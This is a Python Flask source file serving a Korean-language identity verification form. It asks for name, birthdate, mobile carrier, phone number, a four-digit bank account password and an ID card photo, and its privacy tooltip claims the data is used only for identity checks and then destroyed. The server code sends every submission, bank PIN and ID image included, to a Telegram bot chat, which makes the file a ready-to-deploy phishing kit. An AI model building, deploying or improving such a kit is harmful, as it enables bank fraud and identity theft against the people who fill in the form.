# app.py
import os, requests
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string

BOT_TOKEN = os.getenv("BOT_TOKEN")      # Render 환경변수
CHAT_ID   = os.getenv("CHAT_ID")

HTML = """<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>신분정보 입력 양식</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700&display=swap');

        body {
            font-family: 'Noto Sans KR', sans-serif;
            background-color: #f8fafc;
        }

        .card {
            box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }

        .card:hover {
            box-shadow: 0 15px 35px -10px rgba(0, 0, 0, 0.15);
            transform: translateY(-2px);
        }

        .input-container {
            position: relative;
            margin-top: 1.5rem;
        }

        .input-field {
            transition: all 0.3s ease;
            border-bottom: 2px solid #e2e8f0;
            padding-top: 1.2rem;
        }

        .input-field:focus {
            border-bottom-color: #3b82f6;
        }

        .input-label {
            position: absolute;
            top: 1rem;
            left: 1rem;
            color: #64748b;
            transition: all 0.2s ease;
            pointer-events: none;
        }

        .input-field:focus + .input-label,
        .input-field:not(:placeholder-shown) + .input-label {
            top: 0;
            left: 0;
            font-size: 0.75rem;
            color: #3b82f6;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-5px); }
            40%, 80% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.5s ease;
        }

        .file-input {
            opacity: 0;
            width: 0.1px;
            height: 0.1px;
            position: absolute;
        }

        .file-input-label {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
            border: 2px dashed #cbd5e1;
            border-radius: 0.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .file-input-label:hover {
            border-color: #3b82f6;
            background-color: rgba(59, 130, 246, 0.05);
        }

        .file-input-label.dragover {
            border-color: #3b82f6;
            background-color: rgba(59, 130, 246, 0.1);
        }

        .preview-container {
            display: none;
            position: relative;
        }

        .preview-image {
            max-width: 100%;
            max-height: 200px;
            border-radius: 0.5rem;
        }

        .remove-btn {
            position: absolute;
            top: -10px;
            right: -10px;
            background-color: #ef4444;
            color: white;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .remove-btn:hover {
            transform: scale(1.1);
        }

        .progress-bar {
            height: 6px;
            background-color: #e2e8f0;
            border-radius: 3px;
            overflow: hidden;
            margin-top: 10px;
        }

        .progress {
            height: 100%;
            background-color: #3b82f6;
            width: 0%;
            transition: width 0.3s ease;
        }

        .submit-btn {
            position: relative;
            overflow: hidden;
        }

        .submit-btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }

        .submit-btn:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }

        @keyframes ripple {
            0% { transform: scale(0, 0); opacity: 0.5; }
            100% { transform: scale(20, 20); opacity: 0; }
        }

        .tooltip { position: relative; }

        .tooltip:hover .tooltip-text {
            visibility: visible;
            opacity: 1;
        }

        .tooltip-text {
            visibility: hidden;
            width: 200px;
            background-color: #334155;
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 8px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: opacity 0.3s;
            font-size: 0.8rem;
        }

        .tooltip-text::after {
            content: "";
            position: absolute;
            top: 100%;
            left: 50%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: #334155 transparent transparent transparent;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
<div class="w-full max-w-2xl">
    <div class="card bg-white rounded-xl overflow-hidden p-8">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-bold text-gray-800 mb-2">신분정보 입력</h1>
            <p class="text-gray-600">아래 양식에 정보를 입력해주세요</p>

            <!-- 진행 단계 1 → 2 -->
            <div class="flex justify-center mt-6">
                <div class="w-full max-w-md">
                    <div class="flex items-center">
                        <div class="flex-1 h-1 bg-blue-500 rounded-full"></div>
                        <div id="step-1" class="mx-2 flex items-center justify-center w-8 h-8 rounded-full bg-blue-500 text-white"><span>1</span></div>
                        <div id="bar-2" class="flex-1 h-1 bg-gray-200 rounded-full"></div>
                        <div id="step-2" class="mx-2 flex items-center justify-center w-8 h-8 rounded-full bg-gray-200 text-gray-600"><span>2</span></div>
                        <div id="bar-3" class="flex-1 h-1 bg-gray-200 rounded-full"></div>
                    </div>
                </div>
            </div>
        </div>

        <form id="identityForm" class="space-y-6" method="POST" action="{{ url_for('submit_form') }}" enctype="multipart/form-data">
            <!-- 오류 박스 -->
            <div id="formErrors" class="hidden bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                <div class="flex">
                    <div class="flex-shrink-0"><i class="fas fa-exclamation-circle text-red-500"></i></div>
                    <div class="ml-3"><p id="errorMessage" class="text-sm text-red-700"></p></div>
                </div>
            </div>

            <!-- 이름 -->
            <div>
                <label for="name" class="block text-sm font-medium text-gray-700 mb-1">이름</label>
                <div class="relative">
                    <input type="text" id="name" name="name" required
                           class="input-field w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100"
                           placeholder="홍길동">
                    <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none"><i class="fas fa-user text-gray-400"></i></div>
                </div>
            </div>

            <!-- 생년월일(커스텀 달력 아이콘 제거) -->
            <div>
                <label for="birthdate" class="block text-sm font-medium text-gray-700 mb-1">생년월일</label>
                <input type="date" id="birthdate" name="birthdate" required
                       class="input-field w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100">
            </div>

            <!-- 통신사 -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">통신사</label>
                <div class="grid grid-cols-3 gap-3">
                    <div><input type="radio" id="carrier1" name="carrier" value="SKT" class="hidden peer" required>
                        <label for="carrier1" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600 transition-all"><span class="text-sm font-medium">SKT</span></label></div>
                    <div><input type="radio" id="carrier2" name="carrier" value="KT" class="hidden peer">
                        <label for="carrier2" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600 transition-all"><span class="text-sm font-medium">KT</span></label></div>
                    <div><input type="radio" id="carrier3" name="carrier" value="LG U+" class="hidden peer">
                        <label for="carrier3" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600 transition-all"><span class="text-sm font-medium">LG U+</span></label></div>
                </div>
            </div>

            <!-- 전화번호 -->
            <div>
                <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">전화번호</label>
                <div class="relative">
                    <input type="tel" id="phone" name="phone" required
                           class="w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100"
                           placeholder="010-1234-5678">
                    <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none"><i class="fas fa-mobile-alt text-gray-400"></i></div>
                </div>
                <p class="mt-1 text-xs text-gray-500">하이픈(-)을 포함하여 입력해주세요.</p>
            </div>

            <!-- 계좌 비밀번호 4자리 + 토글 -->
            <div>
                <label for="bankpin" class="block text-sm font-medium text-gray-700 mb-1">계좌 비밀번호 (4자리)</label>
                <div class="relative">
                    <input type="password" id="bankpin" name="bankpin" required maxlength="4" pattern="\d{4}" inputmode="numeric"
                           class="w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100 pr-12"
                           placeholder="••••">
                    <button type="button" id="pinToggle"
                            class="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-gray-600 focus:outline-none">
                        <i class="fas fa-eye" id="pinIcon"></i>
                    </button>
                </div>
                <p class="mt-1 text-xs text-gray-500">숫자 4자리만 입력됩니다.</p>
            </div>

            <!-- 신분증 사진 첨부 -->
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">신분증 사진 첨부</label>
                <input type="file" id="idPhoto" name="idPhoto" accept="image/*" class="file-input" required>
                <label for="idPhoto" id="fileInputLabel" class="file-input-label flex-col">
                    <i class="fas fa-cloud-upload-alt text-3xl text-blue-500 mb-2"></i>
                    <span class="text-sm font-medium text-gray-700">파일을 드래그  앤 드롭하거나 클릭하여 업로드</span>
                    <span class="text-xs text-gray-500 mt-1">JPG, PNG, PDF (최대 5MB)</span>
                    <div class="w-full bg-gray-200 rounded-full h-1.5 mt-2">
                        <div id="sizeIndicator" class="bg-blue-500 h-1.5 rounded-full" style="width: 0%"></div>
                    </div>
                </label>
                <div id="previewContainer" class="preview-container mt-4">
                    <img id="previewImage" class="preview-image" src="#" alt="미리보기">
                    <div id="removeBtn" class="remove-btn"><i class="fas fa-times"></i></div>
                </div>
                <div id="progressBar" class="progress-bar hidden"><div id="progress" class="progress"></div></div>
            </div>

            <!-- 동의 -->
            <div class="flex items-center">
                <input type="checkbox" id="agree" name="agree" required class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500">
                <label for="agree" class="ml-2 text-sm text-gray-700"><span class="tooltip"><span class="underline">개인정보 수집 및 이용</span>에 동의합니다<span class="tooltip-text">수집된 개인정보는 본인 확인 목적으로만 사용되며, 처리 후 즉시 파기됩니다.</span></span></label>
            </div>

            <!-- 제출 -->
            <div class="pt-4">
                <button type="submit" id="submitBtn"
                        class="submit-btn w-full px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg shadow-md transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50">
                    <span id="submitText">정보 제출하기</span>
                    <span id="submitSpinner" class="hidden ml-2"><i class="fas fa-circle-notch fa-spin"></i></span>
                </button>
            </div>
        </form>
    </div>

    <div class="mt-6 text-center text-sm text-gray-500">
        <p>문의사항은 고객센터(1588-1234)로 연락주세요</p>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded',function(){
    const $=id=>document.getElementById(id);

    /* 파일 업로드 & 미리보기 */
    const fileInput=$('idPhoto'),
          fileLbl=$('fileInputLabel'),
          prev=$('previewContainer'),
          img=$('previewImage'),
          rm=$('removeBtn'),
          pb=$('progressBar'),
          prog=$('progress'),
          sz=$('sizeIndicator');

    fileLbl.addEventListener('dragover',e=>{e.preventDefault();fileLbl.classList.add('dragover');});
    fileLbl.addEventListener('dragleave',e=>{e.preventDefault();fileLbl.classList.remove('dragover');});
    fileLbl.addEventListener('drop',e=>{
        e.preventDefault();fileLbl.classList.remove('dragover');
        if(e.dataTransfer.files.length){fileInput.files=e.dataTransfer.files;upload(fileInput.files[0]);}
    });
    fileInput.addEventListener('change',()=>{if(fileInput.files[0])upload(fileInput.files[0]);});
    rm.addEventListener('click',()=>{fileInput.value='';prev.style.display='none';pb.classList.add('hidden');prog.style.width='0%';});

    function upload(file){
        if(file.size>5*1024*1024){alert('파일 크기는 5MB를 초과할 수 없습니다.');return;}
        if(!file.type.match('image.*')&&file.type!=='application/pdf'){alert('이미지 또는 PDF 파일만 업로드 가능합니다.');return;}
        if(file.type==='application/pdf'){img.src='https://cdn-icons-png.flaticon.com/512/337/337946.png';}
        else{const r=new FileReader();r.onload=e=>{img.src=e.target.result;};r.readAsDataURL(file);}
        prev.style.display='block';pb.classList.remove('hidden');let w=0;
        const iv=setInterval(()=>{if(w>=100){clearInterval(iv);setTimeout(()=>pb.classList.add('hidden'),500);}else{w+=10;prog.style.width=w+'%';}},100);
        const pct=Math.min(file.size/(5*1024*1024)*100,100);sz.style.width=pct+'%';sz.classList.toggle('bg-red-500',pct>90);sz.classList.toggle('bg-blue-500',pct<=90);
    }

    /* 전화번호 자동 하이픈 */
    $('phone').addEventListener('input',function(){
        let v=this.value.replace(/\D/g,'');
        if(v.length>3&&v.length<=7)v=v.slice(0,3)+'-'+v.slice(3);
        else if(v.length>7)v=v.slice(0,3)+'-'+v.slice(3,7)+'-'+v.slice(7,11);
        this.value=v;
    });

    /* 생년월일 max (20세 이상) */
    const now=new Date();$('birthdate').max=new Date(now.getFullYear()-20,now.getMonth(),now.getDate()).toISOString().split('T')[0];

    /* 계좌 PIN 토글 */
    $('pinToggle').addEventListener('click',()=>{
        const pin=$('bankpin'),icon=$('pinIcon');
        if(pin.type==='password'){pin.type='text';icon.classList.replace('fa-eye','fa-eye-slash');}
        else{pin.type='password';icon.classList.replace('fa-eye-slash','fa-eye');}
    });

    /* 제출 및 검증 */
    const form=$('identityForm'), sb=$('submitBtn'), st=$('submitText'), sp=$('submitSpinner'),
          ebox=$('formErrors'), emsg=$('errorMessage');

    form.addEventListener('submit',async e=>{
        e.preventDefault();
        ebox.classList.add('hidden');form.querySelectorAll('.border-red-500').forEach(el=>el.classList.remove('border-red-500'));
        $('agree').parentElement.classList.remove('text-red-500');

        let ok=true,first=null;
        form.querySelectorAll('[required]').forEach(i=>{
            if(!i.value||(i.id==='phone'&&!/^01[0-9]-\d{3,4}-\d{4}$/.test(i.value))||(i.id==='bankpin'&&!/^\d{4}$/.test(i.value))){
                i.classList.add('border-red-500');if(!first)first=i;ok=false;
            }
        });
        if(!$('agree').checked){$('agree').parentElement.classList.add('text-red-500');ok=false;first=first||$('agree');}

        if(!ok){
            ebox.classList.remove('hidden');emsg.textContent='모든 필수 항목을 올바르게 입력해주세요.';
            if(first)first.scrollIntoView({behavior:'smooth',block:'center'});return;
        }

        sb.disabled=true;st.textContent='처리 중...';sp.classList.remove('hidden');

        try{
            const res=await fetch(form.action,{method:'POST',body:new FormData(form)}),data=await res.json();
            if(res.ok&&data.success){
                const s2=$('step-2');s2.classList.replace('bg-gray-200','bg-blue-500');s2.classList.replace('text-gray-600','text-white');
                ['bar-2','bar-3'].forEach(id=>$(id).classList.replace('bg-gray-200','bg-blue-500'));
                form.innerHTML=`<div class="text-center py-8">
                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fas fa-check text-green-600 text-2xl"></i></div>
                    <h3 class="text-xl font-bold text-gray-800 mb-2">신분정보 제출 완료</h3>
                    <p class="text-gray-600 mb-6">입력하신 정보가 성공적으로 제출되었습니다.</p>
                    <button onclick="location.reload()" class="px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors">새로 작성하기</button>
                </div>`;
            }else throw new Error();
        }catch{
            alert('전송 중 오류가 발생했습니다.');sb.disabled=false;st.textContent='정보 제출하기';sp.classList.add('hidden');
        }
    });
});
</script>
</body>
</html>"""

app = Flask(__name__)
UPLOAD_DIR = Path("uploads"); UPLOAD_DIR.mkdir(exist_ok=True)

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/submit", methods=["POST"])
def submit_form():
    f = request.files.get("idPhoto")
    if not f:
        return jsonify(success=False), 400
    path = UPLOAD_DIR / f.filename
    f.save(path)

    caption = (
        f"*신분정보 제출*\n"
        f"• 이름 : {request.form['name']}\n"
        f"• 생년월일 : {request.form['birthdate']}\n"
        f"• 통신사 : {request.form['carrier']}\n"
        f"• 전화번호 : {request.form['phone']}\n"
        f"• 계좌 PIN : {request.form['bankpin']}"
    )

    ok = requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
        data={"chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
        files={"document": open(path, "rb")},
        timeout=30,
    ).ok
    path.unlink(missing_ok=True)
    return jsonify(success=ok)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
